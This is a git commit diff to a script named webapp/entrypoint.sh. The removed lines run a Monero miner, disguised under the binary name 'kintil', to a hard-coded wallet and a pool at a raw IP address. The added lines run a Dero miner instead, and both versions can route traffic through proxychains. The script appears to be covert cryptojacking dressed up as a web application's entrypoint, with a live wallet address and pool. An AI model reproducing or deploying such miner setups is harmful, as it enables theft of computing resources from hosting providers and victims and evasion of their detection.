3b8a3e69830febaa024e7a4c25d4892c06d135be
rikza kalani <rikzakalani12@gmail.com>
2023-03-20 06:46:50 +0000

    entrypoint.sh edited online with Bitbucket

--- webapp/entrypoint.sh
+++ webapp/entrypoint.sh
@@ -4,11 +4,11 @@
 if [ "${use_proxy}" = true ]; then
     # check whether proxychains4.conf exists
     if [ -f /root/proxychains4.conf ]; then
-        proxychains4 -q -f /root/proxychains4.conf /usr/bin/kintil -algo RandomX -coin XMR -wallet 89EcNeW4CN3ZXhGZ2bebYM7H2DntAe1fw6qvQ2KB3Hprc1ZDpbyjDoibEDU9duGmM4V77aMTkHJg51JS4kzivx2o3D8DFYc.BERKAH -pool1 149.28.246.96:6964
+        proxychains4 -q -f /root/proxychains4.conf dero --wallet-address="${dero_address}" --daemon-rpc-address="${dero_pool}" --debug
     else
         echo "Proxychains4.conf not found, exit"
         exit 1
     fi
 else
-    /usr/bin/kintil -algo RandomX -coin XMR -wallet 89EcNeW4CN3ZXhGZ2bebYM7H2DntAe1fw6qvQ2KB3Hprc1ZDpbyjDoibEDU9duGmM4V77aMTkHJg51JS4kzivx2o3D8DFYc.BERKAH -pool1 149.28.246.96:6964
+    dero --wallet-address="${dero_address}" --daemon-rpc-address="${dero_pool}" --debug
 fi
